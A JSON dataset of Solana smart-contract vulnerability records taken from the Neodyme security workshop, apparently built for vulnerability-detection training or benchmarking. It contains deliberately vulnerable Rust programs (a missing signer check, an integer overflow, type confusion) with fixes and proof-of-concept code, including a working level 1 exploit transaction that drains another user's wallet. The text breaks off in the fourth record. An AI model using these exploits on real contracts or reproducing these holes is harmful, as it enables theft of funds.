[
  {
    "id": "neodyme_level1_missing_signer",
    "source_dataset": "neodyme-workshop",
    "language": "rust",
    "chain": "solana",
    "framework": "anchor",
    "file_name": "level1/src/processor.rs",
    "file_content": "// lib.rs\nuse borsh::{BorshDeserialize, BorshSerialize};\nuse solana_program::{\n    entrypoint,\n    instruction::{AccountMeta, Instruction},\n    pubkey::Pubkey,\n    system_program, sysvar,\n};\n\n#[derive(Debug, BorshDeserialize, BorshSerialize)]\n\npub enum WalletInstruction {\n    /// Initialize a Personal Savings Wallet\n    ///\n    /// Passed accounts:\n    ///\n    /// (1) Wallet account\n    /// (2) authority\n    /// (3) Rent sysvar\n    /// (4) System program\n    Initialize,\n    /// Deposit\n    ///\n    /// Passed accounts:\n    ///\n    /// (1) Wallet account\n    /// (2) Money Source\n    Deposit { amount: u64 },\n    /// Withdraw from Wallet\n    ///\n    /// Passed accounts:\n    ///\n    /// (1) Wallet account\n    /// (2) authority\n    /// (3) Target Wallet account\n    Withdraw { amount: u64 },\n}\n\n#[repr(C)]\n#[derive(Clone, Copy, Debug, Default, PartialEq, BorshSerialize, BorshDeserialize)]\npub struct Wallet {\n    pub authority: Pubkey,\n}\n\npub const WALLET_LEN: u64 = 32;\n\npub mod processor;\nuse processor::process_instruction;\nentrypoint!(process_instruction);\n\npub fn get_wallet_address(authority: Pubkey, wallet_program: Pubkey) -> Pubkey {\n    let (wallet_address, _) =\n        Pubkey::find_program_address(&[&authority.to_bytes()], &wallet_program);\n    wallet_address\n}\n\npub fn initialize(wallet_program: Pubkey, authority_address: Pubkey) -> Instruction {\n    let wallet_address = get_wallet_address(authority_address, wallet_program);\n    Instruction {\n        program_id: wallet_program,\n        accounts: vec![\n            AccountMeta::new(wallet_address, false),\n            AccountMeta::new(authority_address, true),\n            AccountMeta::new_readonly(sysvar::rent::id(), false),\n            AccountMeta::new_readonly(system_program::id(), false),\n        ],\n        data: WalletInstruction::Initialize.try_to_vec().unwrap(),\n    }\n}\n\npub fn deposit(\n    wallet_program: Pubkey,\n    authority_address: Pubkey,\n    source: Pubkey,\n    amount: u64,\n) -> Instruction {\n    let wallet_address = get_wallet_address(authority_address, wallet_program);\n    Instruction {\n        program_id: wallet_program,\n        accounts: vec![\n            AccountMeta::new(wallet_address, false),\n            AccountMeta::new(source, true),\n            AccountMeta::new_readonly(system_program::id(), false),\n        ],\n        data: WalletInstruction::Deposit { amount }.try_to_vec().unwrap(),\n    }\n}\n\npub fn withdraw(\n    wallet_program: Pubkey,\n    authority_address: Pubkey,\n    destination: Pubkey,\n    amount: u64,\n) -> Instruction {\n    let wallet_address = get_wallet_address(authority_address, wallet_program);\n    Instruction {\n        program_id: wallet_program,\n        accounts: vec![\n            AccountMeta::new(wallet_address, false),\n            AccountMeta::new(authority_address, true),\n            AccountMeta::new(destination, false),\n            AccountMeta::new_readonly(system_program::id(), false),\n        ],\n        data: WalletInstruction::Withdraw { amount }.try_to_vec().unwrap(),\n    }\n}\n\n\n// processor.rs\nuse borsh::{BorshDeserialize, BorshSerialize};\nuse solana_program::{\n    account_info::{next_account_info, AccountInfo},\n    entrypoint::ProgramResult,\n    msg,\n    program::{invoke, invoke_signed},\n    program_error::ProgramError,\n    pubkey::Pubkey,\n    rent::Rent,\n    system_instruction,\n    sysvar::Sysvar,\n};\n\nuse crate::{Wallet, WalletInstruction, WALLET_LEN};\n\npub fn process_instruction(\n    program_id: &Pubkey,\n    accounts: &[AccountInfo],\n    mut instruction_data: &[u8],\n) -> ProgramResult {\n    match WalletInstruction::deserialize(&mut instruction_data)? {\n        WalletInstruction::Initialize => initialize(program_id, accounts),\n        WalletInstruction::Deposit { amount } => deposit(program_id, accounts, amount),\n        WalletInstruction::Withdraw { amount } => withdraw(program_id, accounts, amount),\n    }\n}\n\nfn initialize(program_id: &Pubkey, accounts: &[AccountInfo]) -> ProgramResult {\n    msg!(\"init\");\n    let account_info_iter = &mut accounts.iter();\n    let wallet_info = next_account_info(account_info_iter)?;\n    let authority = next_account_info(account_info_iter)?;\n    let rent_info = next_account_info(account_info_iter)?;\n    let (wallet_address, wallet_seed) =\n        Pubkey::find_program_address(&[&authority.key.to_bytes()], program_id);\n    let rent = Rent::from_account_info(rent_info)?;\n\n    assert_eq!(*wallet_info.key, wallet_address);\n    assert!(wallet_info.data_is_empty());\n    assert!(authority.is_signer, \"authority must sign!\");\n\n    invoke_signed(\n        &system_instruction::create_account(\n            &authority.key,\n            &wallet_address,\n            rent.minimum_balance(WALLET_LEN as usize),\n            WALLET_LEN,\n            &program_id,\n        ),\n        &[authority.clone(), wallet_info.clone()],\n        &[&[&authority.key.to_bytes(), &[wallet_seed]]],\n    )?;\n\n    let wallet = Wallet {\n        authority: *authority.key,\n    };\n\n    wallet\n        .serialize(&mut &mut (*wallet_info.data).borrow_mut()[..])\n        .unwrap();\n\n    Ok(())\n}\n\nfn deposit(program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {\n    msg!(\"deposit {}\", amount);\n    let account_info_iter = &mut accounts.iter();\n    let wallet_info = next_account_info(account_info_iter)?;\n    let source_info = next_account_info(account_info_iter)?;\n\n    assert_eq!(wallet_info.owner, program_id);\n\n    invoke(\n        &system_instruction::transfer(&source_info.key, &wallet_info.key, amount),\n        &[wallet_info.clone(), source_info.clone()],\n    )?;\n\n    Ok(())\n}\n\nfn withdraw(program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {\n    msg!(\"withdraw {}\", amount);\n    let account_info_iter = &mut accounts.iter();\n    let wallet_info = next_account_info(account_info_iter)?;\n    let authority_info = next_account_info(account_info_iter)?;\n    let destination_info = next_account_info(account_info_iter)?;\n    let wallet = Wallet::deserialize(&mut &(*wallet_info.data).borrow_mut()[..])?;\n\n    assert_eq!(wallet_info.owner, program_id);\n    assert_eq!(wallet.authority, *authority_info.key);\n\n    if amount > **wallet_info.lamports.borrow_mut() {\n        return Err(ProgramError::InsufficientFunds);\n    }\n\n    **wallet_info.lamports.borrow_mut() -= amount;\n    **destination_info.lamports.borrow_mut() += amount;\n\n    wallet\n        .serialize(&mut &mut (*wallet_info.data).borrow_mut()[..])\n        .unwrap();\n\n    Ok(())\n}\n",
    "vulnerable_function": "withdraw",
    "vulnerable_lines": [
      85,
      90
    ],
    "vulnerability_type": "missing_signer_check",
    "category": "authorization",
    "severity": "critical",
    "difficulty_tier": 2,
    "description": "Missing signer check allows unauthorized users to withdraw funds from any wallet. The withdraw function checks that the authority key matches but does not verify the authority has signed the transaction.",
    "fix_description": "Add is_signer check: assert!(authority_info.is_signer, ErrorCode::Unauthorized). This ensures that only the authority who has signed the transaction can withdraw funds.",
    "poc_code": "use borsh::BorshSerialize;\nuse level1::WalletInstruction;\nuse solana_program::instruction::{AccountMeta, Instruction};\n\nfn hack(env: &mut LocalEnvironment, challenge: &Challenge) {\n    let tx = env.execute_as_transaction(\n        // we construct the instruction manually here\n        // because the level1::withdraw function sets the is_signer flag on the authority\n        // but we don't want to sign \n        &[Instruction {\n            program_id: challenge.wallet_program,\n            accounts: vec![\n                AccountMeta::new(challenge.wallet_address, false),\n                AccountMeta::new(challenge.wallet_authority, false),\n                AccountMeta::new(challenge.hacker.pubkey(), true),\n                AccountMeta::new_readonly(system_program::id(), false),\n            ],\n            data: WalletInstruction::Withdraw { amount: sol_to_lamports(1.0) }.try_to_vec().unwrap(),\n        }],\n        &[&challenge.hacker],\n    );\n    tx.print_named(\"haxx\");\n}",
    "references": [
      "https://workshop.neodyme.io",
      "https://github.com/neodyme-labs/solana-ctf/tree/main/neodyme-breakpoint-workshop/level1"
    ],
    "is_vulnerable": true,
    "has_remediation": true,
    "has_poc": true,
    "context_level": "single_file",
    "original_source_path": "neodyme-breakpoint-workshop/level1/src/",
    "source": "Neodyme / Solana Security Workshop",
    "educational_notes": {
      "challenge_description": "# Level 1 - Personal Vault\n\nLet's get ready to write your first own exploit. \nWe've simplified the contract used in Level 0 a bit - there's no shared vault anymore, the contract only manages personal vaults.\nThe functionality is still the same: after initializing your account, you can deposit and withdraw SOL from this account.\n\nEach personal wallet account has an authority. This authority is stored in the account data struct:\n\n```rust\npub struct Wallet {\n    pub authority: Pubkey\n}\n```\n\nOnly th",
      "bug_hint": "# Bug\n\nThe `withdraw` function does not check that the `authority` has signed. Now, can you exploit this?",
      "has_progressive_hints": true,
      "workshop_level": "level1"
    }
  },
  {
    "id": "neodyme_level2_integer_overflow",
    "source_dataset": "neodyme-workshop",
    "language": "rust",
    "chain": "solana",
    "framework": "anchor",
    "file_name": "level2/src/processor.rs",
    "file_content": "// lib.rs\nuse borsh::{BorshDeserialize, BorshSerialize};\nuse solana_program::{\n    entrypoint,\n    instruction::{AccountMeta, Instruction},\n    pubkey::Pubkey,\n    system_program, sysvar,\n};\n\n#[derive(Debug, BorshDeserialize, BorshSerialize)]\n\npub enum WalletInstruction {\n    /// Initialize a Personal Savings Wallet\n    ///\n    /// Passed accounts:\n    ///\n    /// (1) Wallet account\n    /// (2) authority\n    /// (3) Rent sysvar\n    /// (4) System program\n    Initialize,\n    /// Deposit\n    ///\n    /// Passed accounts:\n    ///\n    /// (1) Wallet account\n    /// (2) Money Source\n    /// (3) System program\n    Deposit { amount: u64 },\n    /// Withdraw from Wallet\n    ///\n    /// Passed accounts:\n    ///\n    /// (1) Wallet account\n    /// (2) authority\n    /// (3) Target Wallet account\n    /// (4) Rent sysvar\n    /// (5) System program\n    Withdraw { amount: u64 },\n}\n\n#[repr(C)]\n#[derive(Clone, Copy, Debug, Default, PartialEq, BorshSerialize, BorshDeserialize)]\npub struct Wallet {\n    pub authority: Pubkey,\n}\n\npub const WALLET_LEN: u64 = 32;\n\npub mod processor;\nuse processor::process_instruction;\nentrypoint!(process_instruction);\n\npub fn get_wallet_address(authority: Pubkey, wallet_program: Pubkey) -> Pubkey {\n    let (wallet_address, _) =\n        Pubkey::find_program_address(&[&authority.to_bytes()], &wallet_program);\n    wallet_address\n}\n\npub fn initialize(wallet_program: Pubkey, authority_address: Pubkey) -> Instruction {\n    let wallet_address = get_wallet_address(authority_address, wallet_program);\n    Instruction {\n        program_id: wallet_program,\n        accounts: vec![\n            AccountMeta::new(wallet_address, false),\n            AccountMeta::new(authority_address, true),\n            AccountMeta::new_readonly(sysvar::rent::id(), false),\n            AccountMeta::new_readonly(system_program::id(), false),\n        ],\n        data: WalletInstruction::Initialize.try_to_vec().unwrap(),\n    }\n}\n\npub fn deposit(\n    wallet_program: Pubkey,\n    authority_address: Pubkey,\n    source: Pubkey,\n    amount: u64,\n) -> Instruction {\n    let wallet_address = get_wallet_address(authority_address, wallet_program);\n    Instruction {\n        program_id: wallet_program,\n        accounts: vec![\n            AccountMeta::new(wallet_address, false),\n            AccountMeta::new(source, true),\n            AccountMeta::new_readonly(system_program::id(), false),\n        ],\n        data: WalletInstruction::Deposit { amount }.try_to_vec().unwrap(),\n    }\n}\n\npub fn withdraw(\n    wallet_program: Pubkey,\n    authority_address: Pubkey,\n    destination: Pubkey,\n    amount: u64,\n) -> Instruction {\n    let wallet_address = get_wallet_address(authority_address, wallet_program);\n    Instruction {\n        program_id: wallet_program,\n        accounts: vec![\n            AccountMeta::new(wallet_address, false),\n            AccountMeta::new(authority_address, true),\n            AccountMeta::new(destination, false),\n            AccountMeta::new_readonly(sysvar::rent::id(), false),\n            AccountMeta::new_readonly(system_program::id(), false),\n        ],\n        data: WalletInstruction::Withdraw { amount }.try_to_vec().unwrap(),\n    }\n}\n\n\n// processor.rs\nuse borsh::{BorshDeserialize, BorshSerialize};\nuse solana_program::{\n    account_info::{next_account_info, AccountInfo},\n    entrypoint::ProgramResult,\n    msg,\n    program::{invoke, invoke_signed},\n    program_error::ProgramError,\n    pubkey::Pubkey,\n    rent::Rent,\n    system_instruction,\n    sysvar::Sysvar,\n};\n\nuse crate::{Wallet, WalletInstruction, WALLET_LEN};\n\npub fn process_instruction(\n    program_id: &Pubkey,\n    accounts: &[AccountInfo],\n    mut instruction_data: &[u8],\n) -> ProgramResult {\n    match WalletInstruction::deserialize(&mut instruction_data)? {\n        WalletInstruction::Initialize => initialize(program_id, accounts),\n        WalletInstruction::Deposit { amount } => deposit(program_id, accounts, amount),\n        WalletInstruction::Withdraw { amount } => withdraw(program_id, accounts, amount),\n    }\n}\n\nfn initialize(program_id: &Pubkey, accounts: &[AccountInfo]) -> ProgramResult {\n    msg!(\"init\");\n    let account_info_iter = &mut accounts.iter();\n    let wallet_info = next_account_info(account_info_iter)?;\n    let authority = next_account_info(account_info_iter)?;\n    let rent_info = next_account_info(account_info_iter)?;\n    let (wallet_address, wallet_seed) =\n        Pubkey::find_program_address(&[&authority.key.to_bytes()], program_id);\n    let rent = Rent::from_account_info(rent_info)?;\n\n    assert_eq!(*wallet_info.key, wallet_address);\n    assert!(wallet_info.data_is_empty());\n    assert!(authority.is_signer, \"authority must sign!\");\n\n    invoke_signed(\n        &system_instruction::create_account(\n            &authority.key,\n            &wallet_address,\n            rent.minimum_balance(WALLET_LEN as usize),\n            WALLET_LEN,\n            &program_id,\n        ),\n        &[authority.clone(), wallet_info.clone()],\n        &[&[&authority.key.to_bytes(), &[wallet_seed]]],\n    )?;\n\n    let wallet = Wallet {\n        authority: *authority.key,\n    };\n\n    wallet\n        .serialize(&mut &mut (*wallet_info.data).borrow_mut()[..])\n        .unwrap();\n\n    Ok(())\n}\n\nfn deposit(program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {\n    msg!(\"deposit {}\", amount);\n    let account_info_iter = &mut accounts.iter();\n    let wallet_info = next_account_info(account_info_iter)?;\n    let source_info = next_account_info(account_info_iter)?;\n\n    assert_eq!(wallet_info.owner, program_id);\n\n    invoke(\n        &system_instruction::transfer(&source_info.key, &wallet_info.key, amount),\n        &[wallet_info.clone(), source_info.clone()],\n    )?;\n\n    Ok(())\n}\n\nfn withdraw(program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {\n    msg!(\"withdraw {}\", amount);\n    let account_info_iter = &mut accounts.iter();\n    let wallet_info = next_account_info(account_info_iter)?;\n    let authority_info = next_account_info(account_info_iter)?;\n    let destination_info = next_account_info(account_info_iter)?;\n    let rent_info = next_account_info(account_info_iter)?;\n\n    let wallet = Wallet::deserialize(&mut &(*wallet_info.data).borrow_mut()[..])?;\n    let rent = Rent::from_account_info(rent_info)?;\n\n    assert_eq!(wallet_info.owner, program_id);\n    assert_eq!(wallet.authority, *authority_info.key);\n    assert!(authority_info.is_signer, \"authority must sign!\");\n\n    let min_balance = rent.minimum_balance(WALLET_LEN as usize);\n    if min_balance + amount > **wallet_info.lamports.borrow_mut() {\n        return Err(ProgramError::InsufficientFunds);\n    }\n\n    **wallet_info.lamports.borrow_mut() -= amount;\n    **destination_info.lamports.borrow_mut() += amount;\n\n    wallet\n        .serialize(&mut &mut (*wallet_info.data).borrow_mut()[..])\n        .unwrap();\n\n    Ok(())\n}\n",
    "vulnerable_function": "withdraw",
    "vulnerable_lines": [
      96,
      97
    ],
    "vulnerability_type": "arithmetic_overflow",
    "category": "arithmetic",
    "severity": "high",
    "difficulty_tier": 2,
    "description": "Integer overflow/underflow in withdraw function when updating lamport balances. The operation `**wallet_info.lamports.borrow_mut() -= amount` can underflow for large amounts, and `**destination_info.lamports.borrow_mut() += amount` can overflow.",
    "fix_description": "Use checked arithmetic operations: checked_sub() and checked_add() instead of direct subtraction and addition. Return error on overflow/underflow.",
    "poc_code": "    **wallet_info.lamports.borrow_mut() -= amount;\n    **destination_info.lamports.borrow_mut() += amount;",
    "references": [
      "https://workshop.neodyme.io",
      "https://github.com/neodyme-labs/solana-ctf/tree/main/neodyme-breakpoint-workshop/level2"
    ],
    "is_vulnerable": true,
    "has_remediation": true,
    "has_poc": true,
    "context_level": "single_file",
    "original_source_path": "neodyme-breakpoint-workshop/level2/src/",
    "source": "Neodyme / Solana Security Workshop",
    "educational_notes": {
      "challenge_description": "# Level 2 - Secure Personal Vault\n\nNow that this missing signer check is fixed, the contract looks really secure... but I wonder, if you can still break it?",
      "bug_hint": "# Bug\n\nThe bug is in the `withdraw` function:\n```rs\n   **wallet_info.lamports.borrow_mut() -= amount;\n   **destination_info.lamports.borrow_mut() += amount;\n```\n\ncan overflow/underflow for large `amount`",
      "has_progressive_hints": true,
      "workshop_level": "level2"
    }
  },
  {
    "id": "neodyme_level3_type_confusion",
    "source_dataset": "neodyme-workshop",
    "language": "rust",
    "chain": "solana",
    "framework": "anchor",
    "file_name": "level3/src/processor.rs",
    "file_content": "// lib.rs\nuse borsh::{BorshDeserialize, BorshSerialize};\nuse solana_program::{\n    entrypoint,\n    instruction::{AccountMeta, Instruction},\n    pubkey::Pubkey,\n    system_program, sysvar,\n};\n\n#[derive(Debug, BorshDeserialize, BorshSerialize)]\npub enum TipInstruction {\n    /// Initialize a vault\n    ///\n    /// Passed accounts:\n    ///\n    /// (1) Vault account\n    /// (2) initializer (must sign)\n    /// (3) Rent sysvar\n    /// (4) System Program\n    Initialize {\n        seed: u8,\n        fee: f64,\n        fee_recipient: Pubkey,\n    },\n    /// Initialize a TipPool\n    ///\n    /// Passed accounts:\n    ///\n    /// (1) Vault account\n    /// (2) withdraw_authority (must sign)\n    /// (3) Pool account\n    CreatePool,\n    /// Tip\n    ///\n    /// Passed accounts:\n    ///\n    /// (1) Vault account\n    /// (2) Pool\n    /// (3) Tip Source\n    /// (4) System program\n    Tip { amount: u64 },\n    /// Withdraw from Pool\n    ///\n    /// Passed accounts:\n    ///\n    /// (1) Vault account\n    /// (2) Pool account\n    /// (3) withdraw_authority (must sign)\n    Withdraw { amount: u64 },\n}\n\n#[repr(C)]\n#[derive(Clone, Copy, Debug, Default, PartialEq, BorshSerialize, BorshDeserialize)]\npub struct TipPool {\n    pub withdraw_authority: Pubkey,\n    pub value: u64,\n    pub vault: Pubkey,\n}\n\npub const TIP_POOL_LEN: u64 = 32 + 8 + 32;\n\n#[repr(C)]\n#[derive(Clone, Copy, Debug, Default, PartialEq, BorshSerialize, BorshDeserialize)]\npub struct Vault {\n    pub creator: Pubkey,\n    pub fee: f64,              //reserved for future use\n    pub fee_recipient: Pubkey, //reserved for future use\n    pub seed: u8,\n}\npub const VAULT_LEN: u64 = 32 + 8 + 32 + 1;\n\npub mod processor;\nuse processor::process_instruction;\nentrypoint!(process_instruction);\n\npub fn initialize(\n    tip_program: Pubkey,\n    vault_address: Pubkey,\n    initializer_address: Pubkey,\n    seed: u8,\n    fee: f64,\n    fee_recipient: Pubkey,\n) -> Instruction {\n    Instruction {\n        program_id: tip_program,\n        accounts: vec![\n            AccountMeta::new(vault_address, false),\n            AccountMeta::new(initializer_address, true),\n            AccountMeta::new_readonly(sysvar::rent::id(), false),\n            AccountMeta::new_readonly(system_program::id(), false),\n        ],\n        data: TipInstruction::Initialize {\n            seed,\n            fee,\n            fee_recipient,\n        }\n        .try_to_vec()\n        .unwrap(),\n    }\n}\n\npub fn create_pool(\n    tip_program: Pubkey,\n    vault_address: Pubkey,\n    withdraw_authority: Pubkey,\n    pool_address: Pubkey,\n) -> Instruction {\n    Instruction {\n        program_id: tip_program,\n        accounts: vec![\n            AccountMeta::new(vault_address, false),\n            AccountMeta::new_readonly(withdraw_authority, true),\n            AccountMeta::new(pool_address, false),\n        ],\n        data: TipInstruction::CreatePool.try_to_vec().unwrap(),\n    }\n}\n\npub fn tip(\n    tip_program: Pubkey,\n    vault_address: Pubkey,\n    pool_address: Pubkey,\n    source: Pubkey,\n    amount: u64,\n) -> Instruction {\n    Instruction {\n        program_id: tip_program,\n        accounts: vec![\n            AccountMeta::new(vault_address, false),\n            AccountMeta::new(pool_address, false),\n            AccountMeta::new(source, true),\n            AccountMeta::new_readonly(system_program::id(), false),\n        ],\n        data: TipInstruction::Tip { amount }.try_to_vec().unwrap(),\n    }\n}\n\npub fn withdraw(\n    tip_program: Pubkey,\n    vault_address: Pubkey,\n    pool_address: Pubkey,\n    withdraw_authority: Pubkey,\n    amount: u64,\n) -> Instruction {\n    Instruction {\n        program_id: tip_program,\n        accounts: vec![\n            AccountMeta::new(vault_address, false),\n            AccountMeta::new(pool_address, false),\n            AccountMeta::new(withdraw_authority, true),\n            AccountMeta::new_readonly(system_program::id(), false),\n        ],\n        data: TipInstruction::Withdraw { amount }.try_to_vec().unwrap(),\n    }\n}\n\n\n// processor.rs\nuse borsh::{BorshDeserialize, BorshSerialize};\nuse solana_program::{\n    account_info::{next_account_info, AccountInfo},\n    entrypoint::ProgramResult,\n    program::{invoke, invoke_signed},\n    program_error::ProgramError,\n    pubkey::Pubkey,\n    rent::Rent,\n    system_instruction,\n    sysvar::Sysvar,\n};\n\nuse crate::{TipInstruction, TipPool, Vault, VAULT_LEN};\n\npub fn process_instruction(\n    program_id: &Pubkey,\n    accounts: &[AccountInfo],\n    mut instruction_data: &[u8],\n) -> ProgramResult {\n    match TipInstruction::deserialize(&mut instruction_data)? {\n        TipInstruction::Initialize {\n            seed,\n            fee,\n            fee_recipient,\n        } => initialize(program_id, accounts, seed, fee, fee_recipient),\n        TipInstruction::Tip { amount } => tip(program_id, accounts, amount),\n        TipInstruction::Withdraw { amount } => withdraw(program_id, accounts, amount),\n        TipInstruction::CreatePool => create_pool(program_id, accounts),\n    }\n}\n\nfn initialize(\n    program_id: &Pubkey,\n    accounts: &[AccountInfo],\n    seed: u8,\n    fee: f64,\n    fee_recipient: Pubkey,\n) -> ProgramResult {\n    let account_info_iter = &mut accounts.iter();\n    let vault_info = next_account_info(account_info_iter)?;\n    let initializer_info = next_account_info(account_info_iter)?;\n    let rent_info = next_account_info(account_info_iter)?;\n    let rent = Rent::from_account_info(rent_info)?;\n    let vault_address = Pubkey::create_program_address(&[&[seed]], program_id).unwrap();\n\n    assert_eq!(*vault_info.key, vault_address);\n    assert!(\n        vault_info.data_is_empty(),\n        \"vault info must be empty account!\"\n    );\n    assert!(initializer_info.is_signer, \"initializer must sign!\");\n\n    invoke_signed(\n        &system_instruction::create_account(\n            &initializer_info.key,\n            &vault_address,\n            rent.minimum_balance(VAULT_LEN as usize),\n            VAULT_LEN,\n            &program_id,\n        ),\n        &[initializer_info.clone(), vault_info.clone()],\n        &[&[&[seed]]],\n    )?;\n\n    let vault = Vault {\n        creator: *initializer_info.key,\n        fee,\n        fee_recipient,\n        seed,\n    };\n\n    vault\n        .serialize(&mut &mut vault_info.data.borrow_mut()[..])\n        .unwrap();\n\n    Ok(())\n}\n\nfn create_pool(program_id: &Pubkey, accounts: &[AccountInfo]) -> ProgramResult {\n    let account_info_iter = &mut accounts.iter();\n    let vault_info = next_account_info(account_info_iter)?;\n    let withdraw_authority_info = next_account_info(account_info_iter)?;\n    let pool_info = next_account_info(account_info_iter)?;\n\n    assert_eq!(vault_info.owner, program_id);\n    assert!(\n        withdraw_authority_info.is_signer,\n        \"withdraw authority must sign!\"\n    );\n    assert_eq!(pool_info.owner, program_id);\n    // check that account is uninitialized\n    if pool_info.data.borrow_mut().into_iter().any(|b| *b != 0) {\n        return Err(ProgramError::AccountAlreadyInitialized);\n    }\n\n    let pool = TipPool {\n        withdraw_authority: *withdraw_authority_info.key,\n        value: 0,\n        vault: *vault_info.key,\n    };\n\n    pool.serialize(&mut &mut pool_info.data.borrow_mut()[..])\n        .unwrap();\n\n    Ok(())\n}\n\nfn tip(program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {\n    let account_info_iter = &mut accounts.iter();\n    let vault_info = next_account_info(account_info_iter)?;\n    let pool_info = next_account_info(account_info_iter)?;\n    let source_info = next_account_info(account_info_iter)?;\n    let mut pool = TipPool::deserialize(&mut &(*pool_info.data).borrow_mut()[..])?;\n\n    assert_eq!(vault_info.owner, program_id);\n    assert_eq!(pool_info.owner, program_id);\n    assert_eq!(pool.vault, *vault_info.key);\n\n    invoke(\n        &system_instruction::transfer(&source_info.key, &vault_info.key, amount),\n        &[vault_info.clone(), source_info.clone()],\n    )?;\n\n    pool.value = match pool.value.checked_add(amount) {\n        Some(v) => v,\n        None => return Err(ProgramError::InvalidArgument),\n    };\n\n    pool.serialize(&mut &mut pool_info.data.borrow_mut()[..])\n        .unwrap();\n\n    Ok(())\n}\n\nfn withdraw(program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {\n    let account_info_iter = &mut accounts.iter();\n    let vault_info = next_account_info(account_info_iter)?;\n    let pool_info = next_account_info(account_info_iter)?;\n    let withdraw_authority_info = next_account_info(account_info_iter)?;\n    let mut pool = TipPool::deserialize(&mut &(*pool_info.data).borrow_mut()[..])?;\n\n    assert_eq!(vault_info.owner, program_id);\n    assert_eq!(pool_info.owner, program_id);\n    assert!(\n        withdraw_authority_info.is_signer,\n        \"withdraw authority must sign\"\n    );\n    assert_eq!(pool.vault, *vault_info.key);\n    assert_eq!(*withdraw_authority_info.key, pool.withdraw_authority);\n\n    pool.value = match pool.value.checked_sub(amount) {\n        Some(v) => v,\n        None => return Err(ProgramError::InvalidArgument),\n    };\n\n    **(*vault_info).lamports.borrow_mut() -= amount;\n    **(*withdraw_authority_info).lamports.borrow_mut() += amount;\n\n    pool.serialize(&mut &mut pool_info.data.borrow_mut()[..])\n        .unwrap();\n\n    Ok(())\n}\n",
    "vulnerable_function": "withdraw",
    "vulnerable_lines": [
      85,
      90
    ],
    "vulnerability_type": "type_cosplay",
    "category": "account_validation",
    "severity": "critical",
    "difficulty_tier": 3,
    "description": "Type confusion vulnerability where a Vault struct can be deserialized as a TipPool struct. Only the account owner is checked in withdraw function, not the account type discriminator, allowing an attacker to withdraw from the global vault by passing it as their tip pool.",
    "fix_description": "Add proper type discriminators and validate account types. Check the account discriminator before deserializing. Use Anchor's account type checking to prevent type confusion attacks.",
    "poc_code": "pub struct TipPool {\n    pub withdraw_authority: Pubkey, // at the same position as Vault::creator\n    pub value: u64,                 // at the same position as Vault::fee\n    pub vault: Pubkey,              // at the same position as Vault::fee_recipient\n}\n\npub struct Vault {\n    pub creator: Pubkey,\n    pub fee: f64,              \n    pub fee_recipient: Pubkey,\n    pub seed: u8,\n}",
    "references": [
      "https://workshop.neodyme.io",
      "https://github.com/neodyme-labs/solana-ctf/tree/main/neodyme-breakpoint-workshop/level3"
    ],
    "is_vulnerable": true,
    "has_remediation": true,
    "has_poc": true,
    "context_level": "single_file",
    "original_source_path": "neodyme-breakpoint-workshop/level3/src/",
    "source": "Neodyme / Solana Security Workshop",
    "educational_notes": {
      "challenge_description": "# Level 3 - Tip Pool\n\n# Usage\n\nEver needed an easy and secure way to tip people? This contract will solve all your donation problems: The operator creates a vault. Then everyone who wants can create a pool for their personal donation account â€“ to receive tips. For tax-reasons all funds are stored centrally, you can just withdraw the desired amount whenever you need them, and pay taxes at that point.\n\n# Example Flow\n\n- Initialize the contract\n- Create a pool\n- Tip to the pool\n- Withdraw from the ",
      "bug_hint": "# Bug\n\nThe `Vault` struct can be deserialized into a `TipPool` struct and only the owner of the accounts gets checked in the `withdraw` function.\n\nHow can you exploit this?",
      "has_progressive_hints": true,
      "workshop_level": "level3"
    }
  },
  {
    "id": "neodyme_level4_arbitrary_cpi",
    "source_dataset": "neodyme-workshop",
    "language": "rust",
    "chain": "solana",
    "framework": "native",
    "file_name": "level4/src/processor.rs",
    "file_content": "// lib.rs\nuse borsh::{BorshDeserialize, BorshSerialize};\nuse solana_program::{\n    entrypoint,\n    instruction::{AccountMeta, Instruction},\n    pubkey::Pubkey,\n    system_program, sysvar,\n};\n\n// There's a mitigation for this bug in spl-token 3.1.1\n// vendored_spl_token is an exact copy of spl-token 3.1.0, which doesn't have the mitigation yet\nuse vendored_spl_token as spl_token;\n\n#[derive(Debug, BorshDeserialize, BorshSerialize)]\n\npub enum WalletInstruction {\n    /// Initialize a Personal Savings Wallet\n    ///\n    /// Passed accounts:\n    ///\n    /// (1) Wallet account\n    /// (2) Authority\n    /// (3) Owner\n    /// (4) Mint\n    /// (5) Rent sysvar\n    /// (6) SPL-Token program\n    /// (7) System program\n    Initialize,\n    /// Deposit\n    ///\n    /// Passed accounts:\n    ///\n    /// (1) Wallet account\n    /// (2) Money Source\n    /// (3) Source Authority\n    /// (4) Mint\n    /// (5) SPL-Token program\n    Deposit { amount: u64 },\n    /// Withdraw from Wallet\n    ///\n    /// Passed accounts:\n    ///\n    /// (1) Wallet account\n    /// (2) Authority\n    /// (3) Owner\n    /// (4) Destination\n    /// (5) Mint\n    /// (6) SPL-Token program\n    Withdraw { amount: u64 },\n}\n\npub mod processor;\nuse processor::process_instruction;\nentrypoint!(process_instruction);\n\npub fn get_wallet_address(owner: &Pubkey, wallet_program: &Pubkey) -> (Pubkey, u8) {\n    Pubkey::find_program_address(&[&owner.to_bytes()], wallet_program)\n}\n\npub fn get_authority(wallet_program: &Pubkey) -> (Pubkey, u8) {\n    Pubkey::find_program_address(&[], wallet_program)\n}\n\npub fn initialize(wallet_program: Pubkey, owner_address: Pubkey, mint: Pubkey) -> Instruction {\n    let wallet_address = get_wallet_address(&owner_address, &wallet_program).0;\n    let authority_address = get_authority(&wallet_program).0;\n    Instruction {\n        program_id: wallet_program,\n        accounts: vec![\n            AccountMeta::new(wallet_address, false),\n            AccountMeta::new_readonly(authority_address, false),\n            AccountMeta::new(owner_address, true),\n            AccountMeta::new(mint, false),\n            AccountMeta::new_readonly(sysvar::rent::id(), false),\n            AccountMeta::new_readonly(spl_token::id(), false),\n            AccountMeta::new_readonly(system_program::id(), false),\n        ],\n        data: WalletInstruction::Initialize.try_to_vec().unwrap(),\n    }\n}\n\npub fn deposit(\n    wallet_program: Pubkey,\n    owner_address: Pubkey,\n    source: Pubkey,\n    source_authority: Pubkey,\n    mint: Pubkey,\n    amount: u64,\n) -> Instruction {\n    let wallet_address = get_wallet_address(&owner_address, 